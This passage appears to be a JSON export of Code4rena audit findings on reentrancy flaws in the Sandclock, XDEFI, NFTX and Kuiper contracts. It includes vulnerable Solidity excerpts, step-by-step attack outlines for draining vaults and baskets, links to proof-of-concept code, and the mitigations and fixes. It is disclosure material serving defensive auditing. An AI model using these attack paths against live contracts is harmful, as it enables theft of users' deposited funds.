      "content": "_Submitted by camden, also found by cmichel and harleythedog_\n\nThe impact of this is that users can get significantly more UST withdrawn than they would be alotted if they had done non-reentrant withdraw calls.\n\n#### Proof of Concept\n\nHere's an outline of the attack:\n\nAssume the vault has 100 UST in it.\nThe attacker makes two deposits of 100UST and waits for them to be withdrawable.\nThe attacker triggers a withdraw one of their deposit positions.\nThe vault code executes until it reaches this point: <https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/Vault.sol#L565>\nSince the attacker is the claimer, the vault will call back to the attacker.\nInside `onDepositBurned`, trigger another 100 UST deposit.\nSince `claimers.onWithdraw` has already been called, reducing the amount of shares, but the UST hasn't been transferred yet, the vault will compute the amount of UST to be withdrawn based on an unexpected value for `_totalUnderlyingMinusSponsored` (300).\n<https://github.com/code-423n4/2022-01-sandclock/blob/a90ad3824955327597be00bb0bd183a9c228a4fb/sandclock/contracts/Vault.sol#L618>\n\nAfter the attack, the attacker will have significantly more than if they had withdrawn without reentrancy.\n\nHere's my proof of concept showing a very similar exploit with `deposit`, but I think it's enough to illustrate the point. I have a forge repo if you want to see it, just ping me on discord.\n<https://gist.github.com/CamdenClark/abc67bc1b387c15600549f6dfd5cb27a>\n\n#### Tools Used\n\nForge\n\n#### Recommended Mitigation Steps\n\nReentrancy guards.\n\nAlso, consider simplifying some of the shares logic.\n\n**[ryuheimat (Sandclock) confirmed](https://github.com/code-423n4/2022-01-sandclock-findings/issues/32)** \n\n**[naps62 (Sandclock) resolved](https://github.com/code-423n4/2022-01-sandclock-findings/issues/32#issuecomment-1012049324):**\n > Fixed in https://github.com/sandclock-org/solidity-contracts/pull/75\n\n\n\n",
      "summary": "\nA vulnerability was identified in the Vault code of the Sandclock project. This vulnerability allows users to get more UST withdrawn than they would be alotted if they had done non-reentrant withdraw calls. A proof of concept was provided to illustrate how the attack works, using Forge as the tool. The recommended mitigation steps to prevent this vulnerability are to use reentrancy guards and simplify the share logic.",
      "report_date": {},
      "contest_prize_txt": "$60,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-01-sandclock-contest",
      "sponsor_name": "Sandclock",
      "sponsor_link": "https://twitter.com/SandclockOrg",
      "quality_score": 3,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-01-sandclock",
      "github_link": "https://github.com/code-423n4/2022-01-sandclock-findings/issues/32",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "67",
      "slug": "h-02-withdrawers-can-get-more-value-returned-than-expected-with-reentrant-call-code4rena-sandclock-sandclock-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Sandclock",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Sandclock",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Staking Pool"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Share Inflation"
          }
        },
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "1255",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 6,
      "protocol_id": "316",
      "title": "[H-02] The reentrancy vulnerability in _safeMint can allow an attacker to steal all rewards",
      "content": "_Submitted by cccz, also found by cmichel, Fitraldys, kenzo, onewayfunction, and tqts_\n\nThere is a reentrancy vulnerability in the \\_safeMint function\n```solidity\nfunction _safeMint(\n    address to,\n    uint256 tokenId,\n    bytes memory _data\n) internal virtual {\n    _mint(to, tokenId);\n    require(\n        _checkOnERC721Received(address(0), to, tokenId, _data),\n        \"ERC721: transfer to non ERC721Receiver implementer\"\n    );\n}\n...\nfunction _checkOnERC721Received(\n    address from,\n    address to,\n    uint256 tokenId,\n    bytes memory _data\n) private returns (bool) {\n    if (to.isContract()) {\n        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {\n            return retval == IERC721Receiver.onERC721Received.selector;\n```\nThe lock function changes the totalDepositedXDEFI variable after calling the \\_safeMint function\n```solidity\nfunction lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {\n    // Lock the XDEFI in the contract.\n    SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);\n\n    // Handle the lock position creation and get the tokenId of the locked position.\n    return _lock(amount_, duration_, destination_);\n}\n...\n    function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {\n    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.\n    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");\n\n    // Get bonus multiplier and check that it is not zero (which validates the duration).\n    uint8 bonusMultiplier = bonusMultiplierOf[duration_];\n    require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");\n\n    // Mint a locked staked position NFT to the destination.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));\n\n    // Track deposits.\n    totalDepositedXDEFI += amount_;\n```\n\nSince the updateDistribution function does not use the noReenter modifier, the attacker can re-enter the updateDistribution function in the \\_safeMint function. Since the value of totalDepositedXDEFI is not updated at this time, the \\_pointsPerUnit variable will become abnormally large.\n\n```solidity\n    function updateDistribution() external {\n       uint256 totalUnitsCached = totalUnits;\n\n       require(totalUnitsCached> uint256(0), \"NO_UNIT_SUPPLY\");\n\n       uint256 newXDEFI = _toUint256Safe(_updateXDEFIBalance());\n\n       if (newXDEFI == uint256(0)) return;\n\n       _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);\n\n       emit DistributionUpdated(msg.sender, newXDEFI);\n   }\n   ...\n   function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {\n       uint256 previousDistributableXDEFI = distributableXDEFI;\n       uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;\n\n       return _toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);\n   }\n\n```\n\nIf the attacker calls the lock function to get the NFT before exploiting the reentrance vulnerability, then the unlock function can be called to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function. Since the unlock function calls the \\_updateXDEFIBalance function, the attacker cannot steal the assets deposited by the user\n```solidity\n\nfunction unlock(uint256 tokenId_, address destination_) external noReenter returns (uint256 amountUnlocked_) {\n    // Handle the unlock and get the amount of XDEFI eligible to withdraw.\n    amountUnlocked_ = _unlock(msg.sender, tokenId_);\n\n    // Send the the unlocked XDEFI to the destination.\n    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_);\n\n    // NOTE: This needs to be done after updating `totalDepositedXDEFI` (which happens in `_unlock`) and transferring out.\n    _updateXDEFIBalance();\n}\n...\nfunction _unlock(address account_, uint256 tokenId_) internal returns (uint256 amountUnlocked_) {\n    // Check that the account is the position NFT owner.\n    require(ownerOf(tokenId_) == account_, \"NOT_OWNER\");\n\n    // Fetch position.\n    Position storage position = positionOf[tokenId_];\n    uint96 units = position.units;\n    uint88 depositedXDEFI = position.depositedXDEFI;\n    uint32 expiry = position.expiry;\n\n    // Check that enough time has elapsed in order to unlock.\n    require(expiry != uint32(0), \"NO_LOCKED_POSITION\");\n    require(block.timestamp >= uint256(expiry), \"CANNOT_UNLOCK\");\n\n    // Get the withdrawable amount of XDEFI for the position.\n    amountUnlocked_ = _withdrawableGiven(units, depositedXDEFI, position.pointsCorrection);\n\n    // Track deposits.\n    totalDepositedXDEFI -= uint256(depositedXDEFI);\n\n    // Burn FDT Position.\n    totalUnits -= units;\n    delete positionOf[tokenId_];\n\n    emit LockPositionWithdrawn(tokenId_, account_, amountUnlocked_);\n}\n...\nfunction _withdrawableGiven(uint96 units_, uint88 depositedXDEFI_, int256 pointsCorrection_) internal view returns (uint256 withdrawableXDEFI_) {\n    return\n        (\n            _toUint256Safe(\n                _toInt256Safe(_pointsPerUnit * uint256(units_)) +\n                pointsCorrection_\n            ) / _pointsMultiplier\n        ) + uint256(depositedXDEFI_);\n}\n```\n\n#### Proof of Concept\n\n<https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L253-L281>\n\n#### Recommended Mitigation Steps\n\n    -    function updateDistribution() external  {\n    +    function updateDistribution() external  noReenter {\n\n\n**[deluca-mike (XDEFI) resolved](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1008233320):**\n> Valid and a big issue. However, due to other recommendations, I will not solve it this way. Instead, `updateDistribution()` will be called at the start of every lock/unlock function (so it can't have a `noReenter` modifier), and the `_safeMint` calls will be moved to the end of their respective operations to prevent the effect of the re-entrancy (i.e. position will created with a `_pointsPerUnit` before a re-entering from `_safeMint` can affect it). Tests will be added to show this is not longer possible.\n\n**[deluca-mike (XDEFI) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1012774852):**\n> In our release candidate contract, as mentioned above, `updateDistribution()` is called before each locking and unlocking function, via a [`updatePointsPerUnitAtStart` modifier](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L77-L80), and thus, `updateDistribution()` is now a public fucntion, and since it is used by other functions, cannot be behind a `noReenter`.\n> \n> See:\n> - [`lock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L177)\n> - [`lockWithPermit`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L181)\n> - [`relock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L188)\n> - [`unlock`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L195)\n> - [`relockBatch`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L233)\n> - [`unlockBatch`](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L240)\n> \n> Also, [a test was written](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/test/XDEFIDistributionReceivers.js) to ensure that this is no longer exploitable, and that the contract behaves properly if a re-entrancy call `updateDistribution()`.\n\n**[Ivshti (Judge) commented](https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1013783009):**\n> Agreed with the severity.\n> \n> Resolution of reordering the calls seems to be adequate \n\n\n\n \n",
      "summary": "\nThis bug report is about a reentrancy vulnerability in the _safeMint function of the XDEFIDistribution.sol contract. This function is called by the lock function which changes the totalDepositedXDEFI variable. Since the updateDistribution function does not have the noReenter modifier, an attacker can re-enter the updateDistribution function in the _safeMint function. This will cause the _pointsPerUnit variable to become abnormally large and the attacker can call the lock function to get an NFT before exploiting the reentrance vulnerability. The attacker can then call the unlock function to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function.\n\nThe recommended mitigation step for this vulnerability is to add the noReenter modifier to the updateDistribution function. This will prevent the attacker from re-entering the updateDistribution function in the _safeMint function and exploiting the vulnerability.",
      "report_date": {},
      "contest_prize_txt": "$25,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-01-xdefi-contest",
      "sponsor_name": "XDEFI",
      "sponsor_link": "https://twitter.com/xdefi_wallet",
      "quality_score": 3,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2022-01-xdefi",
      "github_link": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/25",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "75",
      "slug": "h-02-the-reentrancy-vulnerability-in-_safemint-can-allow-an-attacker-to-steal-all-rewards-code4rena-xdefi-xdefi-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "XDEFI",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "XDEFI",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Options Vault"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "1217",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "324",
      "title": "[M-01] Missing non reentrancy modifier",
      "content": "_Submitted by robee_\n\nThe following functions are missing reentrancy modifier although some other pulbic/external functions does use reentrancy modifer.\nEven though I did not find a way to exploit it, it seems like those functions should have the nonReentrant modifier as the other functions have it as well..\n\n```bash\n  NFTXMarketplaceZap.sol, receive is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, __SimpleFeeDistributor__init__ is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, addReceiver is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, initializeVaultReceivers is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, changeReceiverAlloc is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, changeReceiverAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, removeReceiver is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setTreasuryAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setLPStakingAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setInventoryStakingAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setNFTXVaultFactory is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, pauseFeeDistribution is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, rescueTokens is missing a reentrancy modifier\n  NFTXStakingZap.sol, setLPLockTime is missing a reentrancy modifier\n  NFTXStakingZap.sol, setInventoryLockTime is missing a reentrancy modifier\n  NFTXStakingZap.sol, provideInventory721 is missing a reentrancy modifier\n  NFTXStakingZap.sol, provideInventory1155 is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity721ETH is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity1155ETH is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity721 is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity1155 is missing a reentrancy modifier\n  NFTXStakingZap.sol, receive is missing a reentrancy modifier\n  NFTXStakingZap.sol, rescue is missing a reentrancy modifier\n  NFTXV1Buyout.sol, __NFTXV1Buyout_init is missing a reentrancy modifier\n  NFTXV1Buyout.sol, emergencyWithdraw is missing a reentrancy modifier\n  NFTXV1Buyout.sol, clearBuyout is missing a reentrancy modifier\n  NFTXV1Buyout.sol, addBuyout is missing a reentrancy modifier\n  NFTXV1Buyout.sol, removeBuyout is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, __NFTXVault_init is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, finalizeVault is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setVaultMetadata is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setVaultFeatures is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, assignDefaultFeatures is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setFees is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, disableVaultFees is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, deployEligibilityStorage is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setManager is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, mint is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, redeem is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, swap is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, flashLoan is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, setLockTime is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, addLiquidity721 is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, addLiquidity1155 is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, receive is missing a reentrancy modifier\n```\n**[0xKiwi (NFTX) disputed](https://github.com/code-423n4/2021-12-nftx-findings/issues/37)**\n\n**[LSDan (judge) increased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/37#issuecomment-1064587166):**\n > I'm updating this [from a low] to a medium. Reentrancy represents a real and significant risk (as evident by ETC existing) and should be protected against regardless of if you can foresee the external event that causes lack of protection to be an issue.\n> \n> `\n> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the missing reentrancy modifier in some functions in NFTXMarketplaceZap.sol, NFTXSimpleFeeDistributor.sol, NFTXStakingZap.sol, NFTXV1Buyout.sol, NFTXVaultUpgradeable.sol, and PalmNFTXStakingZap.sol. Reentrancy modifier is a security measure used to prevent malicious actors from taking advantage of the functions. In this report, it is mentioned that even though no exploit was found, the functions should still have the nonReentrant modifier as the other functions have it as well. A total of 30 functions are mentioned in the report as missing the reentrancy modifier.",
      "report_date": {},
      "contest_prize_txt": "$75,000 USDC",
      "contest_link": "https://code4rena.com/contests/2021-12-nftx-contest",
      "sponsor_name": "NFTX",
      "sponsor_link": "https://nftx.org/",
      "quality_score": 1,
      "general_score": 1,
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/37",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "69",
      "slug": "m-01-missing-non-reentrancy-modifier-code4rena-nftx-nftx-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "NFTX",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "NFTX",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "788",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "330",
      "title": "[H-03] Reentrancy in settleAuction(): malicious publisher can bypass index timelock mechanism, inject malicious index, and rug the basket",
      "content": "_Submitted by kenzo, also found by itsmeSTYJ and jonah1005_\n\nThe `settleAuction()` function calls `withdrawBounty()` before setting `auctionOngoing = false`, thereby allowing reentrancy.\n\n#### Impact\n\nA malicious publisher can bypass the index timelock mechanism and publish new index which the basket's users won't have time to respond to.\nAt worst case, this means setting weights that allow the publisher to withdraw all the basket's underlying funds for himself, under the guise of a valid new index.\n\n#### Proof of Concept\n\n1.  The publisher (a contract) will propose new valid index and bond the auction.\n\n    To settle the auction, the publisher will execute the following steps in the same transaction:\n\n2. Add a bounty of an ERC20 contract with a malicious `transfer()` function.\n\n3. Settle the valid new weights correctly (using `settleAuction()` with the correct parameters, and passing the malicious bounty id).\n\n4. `settleAuction()` will call `withdrawBounty()` which upon transfer will call the publisher's malicious ERC20 contract.\n\n5. The contract will call `settleAuction()` again, with empty parameters. Since the previous call's effects have already set all the requirements to be met, `settleAuction()` will finish correctly and call `setNewWeights()` which will set the new valid weights and set `pendingWeights.pending = false`.\n\n6. Still inside the malicious ERC20 contract transfer function, the attacker will now call the basket's `publishNewIndex()`, with weights that will transfer all the funds to him upon his burning of shares. This call will succeed to set new pending weights as the previous step set `pendingWeights.pending = false`.\n\n7. Now the malicious `withdrawBounty()` has ended, and the original `settleAuction()` is resuming, but now with malicious weights in `pendingWeights` (set in step 6). `settleAuction()` will now call `setNewWeights()` which will set the basket's weights to be the malicious pending weights.\n\n8. Now `settleAuction` has finished, and the publisher (within the same transaction) will `burn()` all his shares of the basket, thereby transferring all the tokens to himself.\n\nPOC exploit:\nPassword to both files: \"exploit\".\nAttackPublisher.sol , to be put under contracts/contracts/Exploit: <https://pastebin.com/efHZjstS>\nExploitPublisher.test.js , to be put under contracts/test: <https://pastebin.com/knBtcWkk>\n\n#### Tools Used\n\nManual analysis, hardhat.\n\n#### Recommended Mitigation Steps\n\nIn `settleAuction()`, move `basketAsERC20.transfer()` and `withdrawBounty()` to the end of the function, conforming with Checks Effects Interactions pattern.\n\n**[frank-beard (defiProtocol) confirmed](https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/31)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/31#issuecomment-997413099):**\n > This is a re-entrancy finding.\n> \n> There is no denying that the code is vulnerable to re-entrancy\n> \n> The warden identified the way to exploit re-entrancy by using a malicious bounty token.\n> \n> I think the finding is valid and the warden has shown how to run re-entrnacy.\n> \n> That said the POC the warden shows requires calling `publishNewIndex` which is a `onlyPublisher` function.\n> This exploit would be contingent on the publisher rugging the basket.\n>  \n> The code is:\n> - Vulnerable to re-entancy\n> - The warden showed how to trigger it\n> \n> Despite the fact that the POC is flawed, I believe this finding highlights a different vector for re-entrancy (bounty token transfers) as such I agree with a high severity\n> \n> \n\n\n\n \n",
      "summary": "\nThe bug report is about a vulnerability in the settleAuction() function of a contract. This vulnerability allows a malicious publisher to bypass the index timelock mechanism and publish new indexes which the basket’s users won’t have time to respond to. This means that the malicious publisher can set weights that allow them to withdraw all the basket’s underlying funds. The proof of concept exploit provided in the report includes two files, AttackPublisher.sol and ExploitPublisher.test.js, which can be used to demonstrate the vulnerability. The recommended mitigation step is to move the basketAsERC20.transfer() and withdrawBounty() to the end of the settleAuction() function, conforming with the Checks Effects Interactions pattern.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2021-09-kuiper-contest",
      "sponsor_name": "Kuiper",
      "sponsor_link": "https://twitter.com/KuiperFinance",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2021-09-defiprotocol",
      "github_link": "https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/31",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "36",
      "slug": "h-03-reentrancy-in-settleauction-malicious-publisher-can-bypass-index-timelock-mechanism-inject-malicious-index-and-rug-the-basket-code4rena-kuiper-kuiper-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Kuiper",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Kuiper",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "786",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "330",
      "title": "[H-01] Re-entrancy in settleAuction allow stealing all funds",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nNote that the `Basket` contract approved the `Auction` contract with all tokens and the `settleAuction` function allows the auction bonder to transfer all funds out of the basket to themselves.\nThe only limiting factor is the check afterwards that needs to be abided by. It checks if enough tokens are still in the basket after settlement:\n\n```\n// this is the safety check if basket still has all the tokens after removing arbitrary amounts\nfor (uint256 i = 0; i < pendingWeights.length; i++) {\n    uint256 tokensNeeded = basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE;\n    require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);\n}\n```\n\nThe bonder can pass in any `inputTokens`, even malicious ones they created.\nThis allows them to re-enter the `settleAuction` multiple times for the same auction.\n\nCalling this function at the correct time (such that `bondTimestamp - auctionStart` makes `newRatio < basket.ibRatio()`), the attacker can drain more funds each time, eventually draining the entire basket.\n\n## POC\nAssume that the current `basket.ibRatio` is `1e18` (the initial value).\nThe basket publisher calls `basket.publishNewIndex` with some tokens and weights.\nFor simplicity, assume that the pending `tokens` are the same as tokens as before, only the weights are different, i.e., this would just rebalance the portfolio.\nThe function call then starts the auction.\n\nThe important step to note is that the `tokensNeeded` value in `settleAuction` determines how many tokens need to stay in the `basket`.\nIf we can continuously lower this value, we can keep removing tokens from the `basket` until it is empty.\n\nThe `tokensNeeded` variable is computed as `basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE`.\nThe only variable that changes in the computation when re-entering the function is `newRatio` (no basket tokens are burned, and the pending weights are never cleared).\n\nThus if we can show that `newRatio` decreases on each re-entrant call, we can move out more and more funds each time.\n\n#### newRatio decreases on each call\nAfter some time, the attacker calls `bondForRebalance`. This determines the `bondTimestamp - auctionStart` value in `settleAuction`.\nThe attack is possible as soon as `newRatio < basket.ibRatio()`.\nFor example, using the standard parameters the calculation would be:\n\n```solidity\n// a = 2 * ibRatio\nuint256 a = factory.auctionMultiplier() * basket.ibRatio();\n// b = (bondTimestamp - auctionStart) * 1e14\nuint256 b = (bondTimestamp - auctionStart) * BASE / factory.auctionDecrement();\n// newRatio = a - b = 2 * ibRatio - (bondTimestamp - auctionStart) * 1e14\nuint256 newRatio = a - b;\n```\n\nWith our initial assumption of `ibRatio = 1e18` and calling `bondForRebalance` after 11,000 seconds (~3 hours) we will get our result that `newRatio` is less than the initial `ibRatio`:\n\n```python\nnewRatio = a - b = 2 * 1e18 - (11000) * 1e14 = 2e18 - 1.1e18 = 0.9e18 < 1e18 = basket.ibRatio\n```\n\n> This seems to be a reasonable value (when the pending tokens and weights are equal in value to the previous ones) as no other bonder would want to call this earlier such when `newRatio > basket.ibRatio` as they would put in more total value in tokens as they can take out of the basket.\n\n#### re-enter on settleAuction\nThe attacker creates a custom token `attackerToken` that re-enters the `Auction.settleAuction` function on `transferFrom` with parameters we will specify.\n\nThey call `settleAuction` with `inputTokens = [attackerToken]` to re-enter several times.\n\nIn the inner-most call where `newRatio = 0.9e18`, they choose the `inputTokens`/`outputTokens` parameters in a way to pass the initial `require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);` check - transferring out any other tokens of `basket` with `outputTokens`.\n\nThe function will continue to run and call `basket.setNewWeights();` and `basket.updateIBRatio(newRatio);` which will set the new weights (but not clear the pending ones) and set the new `basket.ibRatio`.\n\nExecution then jumps to the 2nd inner call after the `IERC20(inputTokens[i]=attackerToken).safeTransferFrom(...)` and has the chance to transfer out tokens again.\nIt will compute `newRatio` with the new lowered `basket.ibRatio` of `0.9e18`: `newRatio = a - b = 2 * 0.9e18 - 1.1e18 = 0.7e18`.\nTherefore, `tokensNeeded` is lowered as well and the attacker was allowed to transfer out more tokens having carefully chosen `outputWeights`.\n\nThis repeats with `newRatio = 0.3`.\n\nThe attack is quite complicated and requires carefully precomputing and then setting the parameters, as well as sending back the `bondAmount` tokens to the `auction` contract which are then each time transferred back in the function body.\nBut I believe this should work.\n\n## Impact\nThe basket funds can be stolen.\n\n## Recommended Mitigation Steps\nAdd re-entrancy checks (for example, OpenZeppelin's \"locks\") to the `settleAuction` function.",
      "summary": "\nA bug has been identified in the `Basket` contract where the attacker can re-enter the `settleAuction` function multiple times for the same auction and drain the entire basket. This is done by calling the function at the correct time such that the `newRatio` is lower than the `basket.ibRatio`, allowing the attacker to transfer more funds each time. The attack is complicated and requires pre-computing and setting parameters, as well as sending back the `bondAmount` tokens. The impact of this bug is that the basket funds can be stolen. To mitigate this issue, adding re-entrancy checks to the `settleAuction` function is recommended.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2021-09-kuiper-contest",
      "sponsor_name": "Kuiper",
      "sponsor_link": "https://twitter.com/KuiperFinance",
      "quality_score": 5,
      "general_score": 4,
